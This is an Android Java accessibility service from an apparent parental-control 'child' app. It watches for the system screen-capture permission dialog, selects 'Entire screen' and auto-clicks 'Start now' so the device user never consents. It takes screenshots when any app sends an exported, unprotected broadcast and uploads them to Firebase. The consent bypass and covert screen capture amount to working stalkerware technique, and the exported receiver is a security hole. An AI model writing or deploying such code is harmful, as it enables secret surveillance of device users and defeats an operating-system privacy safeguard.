package com.racks.parentalcontrol.child.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import com.racks.parentalcontrol.child.remote.FirebaseClient;
import com.racks.parentalcontrol.child.utils.MySharedPreferences;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.List;

public class AutoClickAccessibilityService extends AccessibilityService {

    private BroadcastReceiver serviceStarterReceiver;
    private static final String TAG = "RaviKumar-AutoClickAccessibilityService";
    public static final String ACTION_TAKE_SCREENSHOT = "com.racks.ACTION_TAKE_SCREENSHOT";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = getServiceInfo();
        info.packageNames = new String[]{"com.android.systemui"};
        setServiceInfo(info);
        Log.d("RaviKumar-AutoClickAccessibilityService","ONServiceConnected");

        serviceStarterReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d("RaviKumar-AutoClickAccessibilityService","onReceive");
                if ("com.racks.ACTION_START_FOREGROUND_SERVICE".equals(intent.getAction())) {
                    if (isForegroundServiceRunning()){
                        return;
                    }
                    Log.d("RaviKumar-AutoClickAccessibilityService","START_LOCATION_SERVICE");
                    Intent serviceIntent = new Intent(context, MyForegroundService.class);
                    ContextCompat.startForegroundService(context, serviceIntent);
                }else if ("com.racks.ACTION_STOP_FOREGROUND_SERVICE".equals(intent.getAction())){
                    Log.d("RaviKumar-AutoClickAccessibilityService","START_LOCATION_SERVICE");
                    Intent serviceIntent = new Intent(context, MyForegroundService.class);
                    serviceIntent.setAction("STOP_FOREGROUND_SERVICE");
                    ContextCompat.startForegroundService(context, serviceIntent);
                }else if (ACTION_TAKE_SCREENSHOT.equals(intent.getAction())) {
                    Log.d(TAG, "Received TAKE_SCREENSHOT broadcast");
                    boolean useTakeScreenshot = intent.getBooleanExtra("useTakeScreenshot", true);
                    simulateScreenshotButton(useTakeScreenshot);
                }
            }
        };

        IntentFilter filter = new IntentFilter();
        filter.addAction("com.racks.ACTION_START_FOREGROUND_SERVICE");
        filter.addAction("com.racks.ACTION_STOP_FOREGROUND_SERVICE");
        filter.addAction(ACTION_TAKE_SCREENSHOT);
        registerReceiver(serviceStarterReceiver, filter, Context.RECEIVER_EXPORTED);
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!isForegroundServiceRunning()) {
            Log.d(TAG, "Foreground service not active — ignoring event");
            return;
        }
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        String className = String.valueOf(event.getClassName());
        Log.d(TAG, "Window changed: " + className);
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();

        if (className.contains("MediaProjectionPermissionActivity") ||
                className.contains("GrantScreenCapturePermissionActivity") && rootNode !=null) {
            Log.d(TAG, "Checking for 'Start now' + 'Cancel' buttons...");

            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.TIRAMISU){
                if (Build.VERSION.SDK_INT > Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    if (clickSpinner(rootNode)) {
                        Log.d(TAG, "Spinner clicked to show options.");
                            AccessibilityNodeInfo updatedRoot = getRootInActiveWindow();
                            if (selectOptionIfExists(updatedRoot, "Entire screen")) {
                                new Handler(Looper.getMainLooper()).postDelayed(() -> autoClickStartNowIfCancelExists(rootNode),100);
                            } else {
                                Log.d(TAG, "'Entire screen' NOT found — skipping start click");
                            }
                    }
                }else{
                    Log.e(TAG, "AutoClick is not working in Android 14");
                }
            }else{
                autoClickStartNowIfCancelExists(rootNode);
            }

        } else {
            Log.d(TAG, "Not projection dialog button");
        }

    }
    private boolean clickSpinner(AccessibilityNodeInfo node) {
        if (node == null) return false;

        if ("android.widget.Spinner".contentEquals(node.getClassName()) && node.isClickable()) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            if (clickSpinner(node.getChild(i))) return true;
        }

        return false;
    }

    private boolean selectOptionIfExists(AccessibilityNodeInfo node, String targetText) {
        if (node == null) return false;

        if (node.getText() != null && targetText.equalsIgnoreCase(node.getText().toString().trim())) {
            // First, try clicking this node directly
            if (node.isClickable()) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }

            // If not clickable, try clicking its parent
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null && parent.isClickable()) {
                return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }

        // Recursively check all child nodes
        for (int i = 0; i < node.getChildCount(); i++) {
            if (selectOptionIfExists(node.getChild(i), targetText)) return true;
        }

        return false;
    }


    private void autoClickStartNowIfCancelExists(AccessibilityNodeInfo rootNode) {
        List<AccessibilityNodeInfo> buttons = new ArrayList<>();
        collectButtons(rootNode, buttons);

        AccessibilityNodeInfo cancelBtn = null;
        AccessibilityNodeInfo startNowBtn = null;

        for (AccessibilityNodeInfo btn : buttons) {
            if (btn.getText() == null) continue;

            String text = btn.getText().toString().trim().toLowerCase();
            if (text.equals("cancel")) {
                cancelBtn = btn;
            } else if ((text.equals("start") || text.equals("start now")) && btn.isClickable() && btn.isEnabled()) {
                startNowBtn = btn;
            }
        }

        if (cancelBtn != null && startNowBtn != null) {
            Log.d(TAG, "Both 'Cancel' and 'Start now' found. Clicking...");
            startNowBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        } else {
            Log.d(TAG, "'Start now' or 'Cancel' not found together — skipping");
        }
    }

    private void collectButtons(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list) {
        if (node == null) return;

        if ("android.widget.Button".contentEquals(node.getClassName())) {
            list.add(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            collectButtons(node.getChild(i), list);
        }
    }
    private void dumpNodeTree(AccessibilityNodeInfo node, int depth) {
        if (node == null) return;

        String indent = new String(new char[depth]).replace("\0", "--");
        CharSequence text = node.getText();
        CharSequence className = node.getClassName();
        CharSequence contentDesc = node.getContentDescription();

        Log.d(TAG, indent + " " +
                "Class: " + className + ", " +
                "Text: " + text + ", " +
                "ContentDesc: " + contentDesc + ", " +
                "Clickable: " + node.isClickable());

        for (int i = 0; i < node.getChildCount(); i++) {
            dumpNodeTree(node.getChild(i), depth + 1);
        }
    }


    private boolean isForegroundServiceRunning() {
        MySharedPreferences sharedPreferences = new MySharedPreferences(getApplicationContext());
        return sharedPreferences.getFgServiceRunningFlag();
    }

    public void simulateScreenshotButton(boolean useTakeScreenshotMethod) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            return;
        }
        boolean success = false;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && useTakeScreenshotMethod) {
            takeScreenshot();
            success = true;
        }
        if (success) {
            Log.d(TAG, "performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT) is worked");
        }

    }


    @RequiresApi(api = Build.VERSION_CODES.R)
    public void takeScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            super.takeScreenshot(
                    0,
                    r -> new Thread(r).start(),
                    new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(@NonNull ScreenshotResult screenshot) {
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(
                                    screenshot.getHardwareBuffer(),
                                    screenshot.getColorSpace()
                            );

                            if (bitmap != null) {
                                bitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                            }

                            screenshot.getHardwareBuffer().close();

                            if (bitmap == null) {
                                Log.e(TAG, "takeScreenshot() bitmap == null, takeScreenshot is not worked");
                            } else {
                                Log.d(TAG, "takeScreenshot() bitmap is not null");
                                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                                bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                                byte[] data = baos.toByteArray();
                                FirebaseClient firebaseClient = new FirebaseClient();
                                firebaseClient.uploadCaptureToFirebase(data, "screen");
                            }
                        }

                        @Override
                        public void onFailure(int errorCode) {
                            Log.e(TAG, "takeScreenshot() -> onFailure(" + errorCode + "), falling back to GLOBAL_ACTION_TAKE_SCREENSHOT");
                        }
                    });
        }
    }
    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (serviceStarterReceiver != null) {
            unregisterReceiver(serviceStarterReceiver);
        }
    }
}
